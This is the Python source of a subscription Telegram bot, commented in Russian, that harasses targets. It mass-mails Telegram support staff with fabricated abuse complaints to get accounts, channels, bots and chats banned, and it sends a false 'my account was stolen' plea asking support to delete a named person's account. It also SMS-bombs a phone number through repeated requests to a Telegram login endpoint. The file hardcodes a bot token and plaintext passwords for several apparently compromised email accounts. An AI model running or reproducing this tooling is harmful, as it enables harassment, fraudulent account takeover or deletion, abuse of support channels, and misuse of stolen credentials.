"""
TenEvoy Reporter Bot — ПОЛНАЯ ВЕРСИЯ
Email рассылка + SMS-атака + Атака на поддержку
"""

import asyncio
import smtplib
import json
import os
import time
import random
import requests
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from aiogram import Bot, Dispatcher, types as atypes
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Command

# ===== КОНФИГ =====
BOT_TOKEN = "8783740903:AAGmt0alM8y-6ZhkJNZE39Lb4NPPHyexeoY"
ADMIN_ID = 8478884644
# =================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
user_states = {}

# Папки для данных
os.makedirs("data", exist_ok=True)

SUBSCRIBERS_FILE = "data/subscribers.json"
BLACKLIST_FILE = "data/blacklist.json"
STATS_FILE = "data/stats.json"

def load_json(file, default=None):
    if default is None:
        default = {} if 'subscribers' in file else []
    if os.path.exists(file):
        try:
            with open(file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_subscribers():
    return load_json(SUBSCRIBERS_FILE, {})

def save_subscribers(data):
    save_json(SUBSCRIBERS_FILE, data)

def load_blacklist():
    return load_json(BLACKLIST_FILE, [])

def save_blacklist(data):
    save_json(BLACKLIST_FILE, data)

def load_stats():
    default = {"total_reports": 0, "total_emails_sent": 0, "total_sms": 0, "total_sms_attacks": 0}
    return load_json(STATS_FILE, default)

def save_stats(data):
    save_json(STATS_FILE, data)

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_subscribed(user_id):
    if is_admin(user_id):
        return True
    subs = load_subscribers()
    return str(user_id) in subs

def is_blacklisted(user_id):
    blacklist = load_blacklist()
    return user_id in blacklist

# ===== EMAIL ОТПРАВИТЕЛИ =====
EMAIL_SENDERS = {
    'message@krn.kz': 'servitsisifi30',
    'nuriketomsk@mail.ru': '777777',
    'miffs@mail.ru': 'Tel89260340597',
    '89189720171@mail.ru': '16031965',
    'lorik_999@mail.ru': '369258',
    'troyka@sibmail.com': 'nbvjatq',
}

# ===== ВСЕ ПОЧТЫ TELEGRAM ПОДДЕРЖКИ (40+ адресов) =====
TELEGRAM_SUPPORT = [
    "support@telegram.org", "dmca@telegram.org", "security@telegram.org",
    "sms@telegram.org", "info@telegram.org", "marta@telegram.org",
    "spam@telegram.org", "alex@telegram.org", "abuse@telegram.org",
    "pavel@telegram.org", "durov@telegram.org", "elies@telegram.org",
    "ceo@telegram.org", "mr@telegram.org", "levlam@telegram.org",
    "perekopsky@telegram.org", "recover@telegram.org", "germany@telegram.org",
    "hyman@telegram.org", "qa@telegram.org", "Stickers@telegram.org",
    "ir@telegram.org", "vadim@telegram.org", "shyam@telegram.org",
    "stopca@telegram.org", "ask@telegram.org", "125support@telegram.org",
    "me@telegram.org", "enquiries@telegram.org", "api_support@telegram.org",
    "marketing@telegram.org", "ca@telegram.org", "recovery@telegram.org",
    "http@telegram.org", "corp@telegram.org", "corona@telegram.org",
    "ton@telegram.org", "sticker@telegram.org"
]

def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        
        if 'gmail.com' in sender_email:
            smtp_server = 'smtp.gmail.com'
        elif 'rambler.ru' in sender_email:
            smtp_server = 'smtp.rambler.ru'
        elif 'mail.ru' in sender_email or 'bk.ru' in sender_email:
            smtp_server = 'smtp.mail.ru'
        else:
            return False
        
        server = smtplib.SMTP(smtp_server, 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

# ===== АТАКА НА ПОДДЕРЖКУ TELEGRAM (ПОЧТЫ) =====
async def support_attack(message_obj, phone_number, username):
    """Отправляет жалобы на все почты Telegram поддержки"""
    subject = "URGENT: Мой аккаунт украли! Помогите вернуть!"
    body = f"""Здравствуйте, уважаемая поддержка Telegram!

На вашей платформе, я наткнулся на мошенника который украл мой аккаунт.

Мои данные:
Номер телефона: +{phone_number}
Username: @{username}

Я много раз пытался войти обратно, но не получается.
Прошу вас удалить все сессии либо сам аккаунт, чтобы мошенник не мог им пользоваться.

Заранее спасибо за помощь!

С уважением,
Владелец аккаунта"""
    
    total = len(EMAIL_SENDERS) * len(TELEGRAM_SUPPORT)
    sent = 0
    
    await message_obj.reply(f"🎯 АТАКА НА ПОДДЕРЖКУ TELEGRAM!\n📞 Телефон: +{phone_number}\n📨 0/{total}")
    
    for sender_email, sender_password in EMAIL_SENDERS.items():
        for receiver in TELEGRAM_SUPPORT:
            if send_email(receiver, sender_email, sender_password, subject, body):
                sent += 1
            await asyncio.sleep(0.3)
    
    stats = load_stats()
    stats["total_reports"] += 1
    stats["total_emails_sent"] += sent
    save_stats(stats)
    
    await message_obj.reply(f"✅ АТАКА НА ПОДДЕРЖКУ ЗАВЕРШЕНА!\n📞 +{phone_number}\n📨 {sent}/{total}\n🔥 ПИСЬМА ОТПРАВЛЕНЫ НА {len(TELEGRAM_SUPPORT)} АДРЕСОВ!")

# ===== SMS-АТАКА (БОМБИНГ НОМЕРА) =====
async def sms_attack(message_obj, phone_number):
    """SMS-бомбинг через Telegram API"""
    phone_number = phone_number.replace('+', '').replace(' ', '').replace('-', '')
    
    if not phone_number.isdigit() or len(phone_number) < 10:
        await message_obj.reply("❌ Неверный формат! Пример: 79991234567")
        return
    
    total_requests = 30
    success = 0
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://my.telegram.org',
        'Referer': 'https://my.telegram.org/'
    }
    
    await message_obj.reply(f"📱 SMS-АТАКА НАЧАЛАСЬ!\n📞 Номер: +{phone_number}\n📨 0/{total_requests}")
    
    for i in range(total_requests):
        try:
            # Запрос на восстановление пароля Telegram
            response = requests.post(
                'https://my.telegram.org/auth/send_password',
                headers=headers,
                data={'phone': '+' + phone_number},
                timeout=5
            )
            if response.status_code in [200, 302]:
                success += 1
            
            # Обновляем прогресс
            if (i + 1) % 10 == 0:
                await message_obj.reply(f"📱 Прогресс: {i+1}/{total_requests} запросов, успешно: {success}")
            
            await asyncio.sleep(random.uniform(1, 2))
        except Exception as e:
            print(f"SMS error: {e}")
            await asyncio.sleep(2)
    
    stats = load_stats()
    stats["total_sms_attacks"] += 1
    stats["total_sms"] += success
    save_stats(stats)
    
    await message_obj.reply(f"✅ SMS-АТАКА ЗАВЕРШЕНА!\n📞 +{phone_number}\n📨 {total_requests} запросов\n✅ Успешно: {success}\n🔥 НОМЕР ЗАСПАМЛЕН!")

# ===== ОБЫЧНЫЕ ЖАЛОБЫ (ДЛЯ АККАУНТОВ, КАНАЛОВ, БОТОВ, ЧАТОВ) =====
async def email_attack(message_obj, target_type, target_value, data, text_dict):
    email_total = len(EMAIL_SENDERS) * len(TELEGRAM_SUPPORT)
    email_sent = 0
    
    text_num = str(random.randint(1, len(text_dict)))
    body = text_dict[text_num].format(**data)
    subject = f"Жалоба на {target_type} в Telegram"
    
    await message_obj.reply(f"📧 {target_type.upper()} АТАКА НАЧАЛАСЬ!\n🎯 {target_value}\n📧 0/{email_total}")
    
    for sender_email, sender_password in EMAIL_SENDERS.items():
        for receiver in TELEGRAM_SUPPORT:
            if send_email(receiver, sender_email, sender_password, subject, body):
                email_sent += 1
            await asyncio.sleep(0.3)
    
    stats = load_stats()
    stats["total_reports"] += 1
    stats["total_emails_sent"] += email_sent
    save_stats(stats)
    
    await message_obj.reply(f"✅ {target_type.upper()} АТАКА ЗАВЕРШЕНА!\n🎯 {target_value}\n📧 {email_sent}/{email_total}\n🔥 ЖАЛОБЫ ОТПРАВЛЕНЫ!")

# ===== ТЕКСТЫ ДЛЯ ЖАЛОБ =====
REPORT_TEXTS = {
    "1": "Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста примите меры.",
    "2": "Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение - {violation_link}. Пожалуйста примите меры.",
    "3": "Здравствуйте, уважаемая поддержка телеграм. Я нашел пользователя который открыто выражается нецензурной лексикой и спамит в чатах. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение - {violation_link}. Пожалуйста примите меры.",
}

CHANNEL_TEXTS = {
    "1": "Здравствуйте, уважаемая поддержка телеграмма. На вашей платформе я нашел канал, который распространяет личные данные невинных людей. Ссылка на канал - {channel_link}, ссылки на нарушения - {channel_violation}. Пожалуйста заблокируйте.",
    "2": "Здравствуйте, уважаемая поддержка телеграмма. На вашей платформе я нашел канал который распространяет жестокое обращение с животными. Ссылка на канал - {channel_link}, ссылки на нарушения - {channel_violation}. Пожалуйста заблокируйте.",
}

BOT_TEXTS = {
    "1": "Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел бота, который осуществляет поиск по личным данным. Ссылка на бота - {bot_user}. Пожалуйста заблокируйте.",
    "2": "Здравствуйте, уважаемая поддержка телеграмма. На вашей платформе я нашел бота который путем заданий приводит людей к суициду. Ссылка на бота {bot_user}. Пожалуйста заблокируйте.",
}

CHAT_TEXTS = {
    "1": "Здравствуйте, уважаемая поддержка телеграмма. Я нашел группу с которой оскорбляют людей. Ссылка на группу - {chat_link}. Пожалуйста примите меры.",
    "2": "Здравствуйте, уважаемая поддержка телеграмма. На вашей платформе я нашел группу с подозрительной активностью. Ссылка на группу - {chat_link}. Пожалуйста примите меры.",
}

# ===== ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ ID =====
async def get_user_id(username):
    try:
        if username.startswith('@'):
            username = username[1:]
        chat = await bot.get_chat(f"@{username}")
        return chat.id, chat.username, chat.first_name
    except:
        return None, None, None

# ===== КЛАВИАТУРЫ =====
def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="👤 Снос аккаунта"), KeyboardButton(text="📢 Снос канала")],
            [KeyboardButton(text="🤖 Снос бота"), KeyboardButton(text="💬 Снос чата")],
            [KeyboardButton(text="🎯 Атака на поддержку"), KeyboardButton(text="📱 SMS-атака")],
            [KeyboardButton(text="🆔 Узнать ID"), KeyboardButton(text="📊 Статистика")],
            [KeyboardButton(text="❌ Отмена"), KeyboardButton(text="👑 Админ-панель")]
        ],
        resize_keyboard=True
    )

def get_admin_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="👥 Подписчики"), KeyboardButton(text="➕ Добавить подписку")],
            [KeyboardButton(text="❌ Удалить подписку"), KeyboardButton(text="🛡️ Чёрный список")],
            [KeyboardButton(text="📊 Статистика"), KeyboardButton(text="📧 Email список")],
            [KeyboardButton(text="🚪 Выход")]
        ],
        resize_keyboard=True
    )

# ===== КОМАНДЫ =====
@dp.message(Command("start"))
async def cmd_start(message: atypes.Message):
    user_id = message.from_user.id
    
    if is_blacklisted(user_id):
        await message.reply("❌ Вы в чёрном списке!")
        return
    
    if not is_subscribed(user_id):
        await message.reply("❌ Нет активной подписки!\n\nДля получения доступа обратитесь: @anti_account")
        return
    
    stats = load_stats()
    
    await message.reply(
        f"🤖 TenEvoy Reporter Bot\n\n"
        f"📧 Email отправители: {len(EMAIL_SENDERS)}\n"
        f"📬 Поддержка TG: {len(TELEGRAM_SUPPORT)}\n"
        f"📨 Писем за раз: {len(EMAIL_SENDERS) * len(TELEGRAM_SUPPORT)}\n"
        f"📱 SMS-атака: Telegram API\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📊 Всего жалоб: {stats['total_reports']}\n"
        f"📧 Отправлено писем: {stats['total_emails_sent']}\n"
        f"📱 SMS атак: {stats['total_sms_attacks']}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👨‍💻 @anti_account\n\n"
        f"Выбери действие:",
        reply_markup=get_main_keyboard()
    )

@dp.message(Command("admin"))
async def cmd_admin(message: atypes.Message):
    if not is_admin(message.from_user.id):
        await message.reply("❌ Доступ запрещён!")
        return
    
    stats = load_stats()
    subs = load_subscribers()
    
    await message.reply(
        f"👑 Админ-панель\n\n"
        f"👥 Подписчиков: {len(subs)}\n"
        f"🚫 В ЧС: {len(load_blacklist())}\n"
        f"📧 Email отправителей: {len(EMAIL_SENDERS)}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📊 Всего жалоб: {stats['total_reports']}\n"
        f"📧 Отправлено писем: {stats['total_emails_sent']}\n"
        f"📱 SMS атак: {stats['total_sms_attacks']}\n"
        f"📱 SMS запросов: {stats['total_sms']}\n\n"
        f"Выбери действие:",
        reply_markup=get_admin_keyboard()
    )

# ===== ОБРАБОТКА КНОПОК =====
@dp.message()
async def handle_buttons(message: atypes.Message):
    user_id = message.from_user.id
    text = message.text
    
    if text == "❌ Отмена" or text == "/cancel":
        if user_id in user_states:
            del user_states[user_id]
        await message.reply("✅ Отменено", reply_markup=get_main_keyboard())
        return
    
    if text == "🚪 Выход":
        await message.reply("Главное меню", reply_markup=get_main_keyboard())
        return
    
    if is_blacklisted(user_id):
        await message.reply("❌ Вы в чёрном списке!")
        return
    
    # ===== АДМИН-ФУНКЦИИ =====
    if is_admin(user_id):
        if text == "➕ Добавить подписку":
            await message.reply("Отправь ID пользователя:\nПример: 123456789")
            user_states[user_id] = {'action': 'admin_add_user'}
            return
        
        if text == "❌ Удалить подписку":
            await message.reply("Отправь ID пользователя:\nПример: 123456789")
            user_states[user_id] = {'action': 'admin_remove_user'}
            return
        
        if text == "👥 Подписчики":
            subs = load_subscribers()
            if not subs:
                await message.reply("📭 Нет подписчиков")
            else:
                txt = "📋 Список подписчиков:\n\n"
                for i, uid in enumerate(list(subs.keys())[:30], 1):
                    txt += f"{i}. {uid}\n"
                await message.reply(txt)
            return
        
        if text == "🛡️ Чёрный список":
            bl = load_blacklist()
            if not bl:
                await message.reply("📭 Чёрный список пуст")
            else:
                txt = "🚫 Чёрный список:\n\n"
                for i, uid in enumerate(bl[:30], 1):
                    txt += f"{i}. {uid}\n"
                await message.reply(txt)
            return
        
        if text == "📊 Статистика":
            stats = load_stats()
            await message.reply(
                f"📊 Детальная статистика\n\n"
                f"📋 Всего жалоб: {stats['total_reports']}\n"
                f"📧 Отправлено писем: {stats['total_emails_sent']}\n"
                f"📱 SMS атак: {stats['total_sms_attacks']}\n"
                f"📱 SMS запросов: {stats['total_sms']}"
            )
            return
        
        if text == "📧 Email список":
            txt = "📧 Email отправители:\n\n"
            for i, email in enumerate(list(EMAIL_SENDERS.keys())[:20], 1):
                txt += f"{i}. {email}\n"
            if len(EMAIL_SENDERS) > 20:
                txt += f"\n... и ещё {len(EMAIL_SENDERS) - 20}"
            await message.reply(txt)
            return
    
    # ===== ПОЛЬЗОВАТЕЛЬСКИЕ ФУНКЦИИ =====
    if not is_subscribed(user_id):
        await message.reply("❌ Нет активной подписки!")
        return
    
    if text == "🆔 Узнать ID":
        user_states[user_id] = {'action': 'get_id'}
        await message.reply(
            "🆔 Узнать ID пользователя\n\n"
            "Отправь username:\n"
            "@durov или просто durov\n\n"
            "Или /cancel"
        )
        return
    
    if text == "📊 Статистика":
        stats = load_stats()
        await message.reply(
            f"📊 Ваша статистика\n\n"
            f"📋 Всего жалоб: {stats['total_reports']}\n"
            f"📧 Отправлено писем: {stats['total_emails_sent']}"
        )
        return
    
    if text == "📱 SMS-атака":
        user_states[user_id] = {'action': 'sms_attack'}
        await message.reply(
            "📱 SMS-атака (бомбинг)\n\n"
            "Отправь номер телефона в формате:\n"
            "79991234567 или +79991234567\n\n"
            "⚠️ Номер получит ~30 SMS с кодами от Telegram\n\n"
            "Или /cancel"
        )
        return
    
    if text == "🎯 Атака на поддержку":
        user_states[user_id] = {'action': 'support_attack'}
        await message.reply(
            "🎯 Атака на поддержку Telegram\n\n"
            "Отправь данные в формате:\n"
            "номер_телефона username\n\n"
            "Пример:\n"
            "79991234567 durov\n\n"
            "⚠️ Отправит письма на 40+ адресов поддержки Telegram\n\n"
            "Или /cancel"
        )
        return
    
    if text == "👤 Снос аккаунта":
        user_states[user_id] = {'action': 'report_user'}
        await message.reply(
            "👤 Снос аккаунта\n\n"
            "Отправь данные (через пробел):\n"
            "username id ссылка_чат ссылка_нарушение\n\n"
            "Пример:\n"
            "@durov 777000 https://t.me/chat/1 https://t.me/chat/2\n\n"
            "Или /cancel"
        )
        return
    
    if text == "📢 Снос канала":
        user_states[user_id] = {'action': 'report_channel'}
        await message.reply(
            "📢 Снос канала\n\n"
            "Отправь данные (через пробел):\n"
            "ссылка_канал ссылка_нарушение\n\n"
            "Пример:\n"
            "https://t.me/bad_channel https://t.me/bad_channel/123\n\n"
            "Или /cancel"
        )
        return
    
    if text == "🤖 Снос бота":
        user_states[user_id] = {'action': 'report_bot'}
        await message.reply(
            "🤖 Снос бота\n\n"
            "Отправь username бота:\n"
            "@bad_bot\n\n"
            "Или /cancel"
        )
        return
    
    if text == "💬 Снос чата":
        user_states[user_id] = {'action': 'report_chat'}
        await message.reply(
            "💬 Снос чата\n\n"
            "Отправь ссылку на чат:\n"
            "https://t.me/joinchat/xxx\n\n"
            "Или /cancel"
        )
        return
    
    # ===== ОБРАБОТКА ВВОДА =====
    state = user_states.get(user_id)
    
    if state and state.get('action') == 'get_id':
        username = text.strip()
        if username.startswith('@'):
            username = username[1:]
        
        await message.reply(f"🔍 Ищу пользователя @{username}...")
        
        try:
            chat = await bot.get_chat(f"@{username}")
            result_text = (
                f"🆔 Результат:\n\n"
                f"👤 Имя: {chat.first_name or 'Неизвестно'}\n"
                f"📝 Username: @{username}\n"
                f"🆔 ID: {chat.id}\n\n"
                f"💡 Скопируй ID для использования в боте"
            )
            await message.reply(result_text)
        except Exception as e:
            await message.reply(f"❌ Пользователь @{username} не найден!\n\nОшибка: {str(e)[:100]}")
        
        del user_states[user_id]
        return
    
    if state and state.get('action') == 'sms_attack':
        await sms_attack(message, text)
        del user_states[user_id]
        return
    
    if state and state.get('action') == 'support_attack':
        parts = text.split()
        if len(parts) < 2:
            await message.reply("❌ Неверный формат!\nНужно: номер username\nПример: 79991234567 durov")
            return
        phone = parts[0]
        username = parts[1]
        await support_attack(message, phone, username)
        del user_states[user_id]
        return
    
    if state and state.get('action') == 'report_user':
        parts = text.split()
        if len(parts) < 4:
            await message.reply("❌ Неверный формат!\nНужно: username id ссылка_чат ссылка_нарушение\n\nПример: @durov 777000 https://t.me/chat/1 https://t.me/chat/2")
            return
        
        await email_attack(message, "аккаунт", parts[0], {
            'username': parts[0],
            'id': parts[1],
            'chat_link': parts[2],
            'violation_link': parts[3]
        }, REPORT_TEXTS)
        del user_states[user_id]
        return
    
    if state and state.get('action') == 'report_channel':
        parts = text.split()
        if len(parts) < 2:
            await message.reply("❌ Неверный формат!\nНужно: ссылка_канал ссылка_нарушение")
            return
        
        await email_attack(message, "канал", parts[0], {
            'channel_link': parts[0],
            'channel_violation': parts[1]
        }, CHANNEL_TEXTS)
        del user_states[user_id]
        return
    
    if state and state.get('action') == 'report_bot':
        if not text.startswith('@'):
            text = '@' + text
        await email_attack(message, "бота", text, {'bot_user': text}, BOT_TEXTS)
        del user_states[user_id]
        return
    
    if state and state.get('action') == 'report_chat':
        await email_attack(message, "чат", text, {'chat_link': text}, CHAT_TEXTS)
        del user_states[user_id]
        return
    
    # ===== АДМИН-ДЕЙСТВИЯ =====
    if state and state.get('action') == 'admin_add_user':
        try:
            target_id = int(text.strip())
            subs = load_subscribers()
            subs[str(target_id)] = {"date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            save_subscribers(subs)
            await message.reply(f"✅ Пользователь {target_id} добавлен в подписку!")
        except:
            await message.reply("❌ Неверный ID!")
        del user_states[user_id]
        await cmd_admin(message)
        return
    
    if state and state.get('action') == 'admin_remove_user':
        target_id = text.strip()
        subs = load_subscribers()
        if target_id in subs:
            del subs[target_id]
            save_subscribers(subs)
            await message.reply(f"✅ Пользователь {target_id} удалён из подписки!")
        else:
            await message.reply(f"❌ Пользователь {target_id} не найден")
        del user_states[user_id]
        await cmd_admin(message)
        return

# ===== ЗАПУСК =====
async def main():
    print("=" * 50)
    print("🤖 TenEvoy Reporter Bot ЗАПУЩЕН!")
    print("=" * 50)
    print(f"👑 Админ ID: {ADMIN_ID}")
    print(f"📧 Email отправителей: {len(EMAIL_SENDERS)}")
    print(f"📬 Поддержка TG: {len(TELEGRAM_SUPPORT)}")
    print(f"📨 Писем за раз: {len(EMAIL_SENDERS) * len(TELEGRAM_SUPPORT)}")
    print(f"📱 SMS-атака: Telegram API")
    print(f"👨‍💻 Разработчик: @anti_account")
    print("=" * 50)
    print("\n✅ Бот готов! Напиши /start в Telegram")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
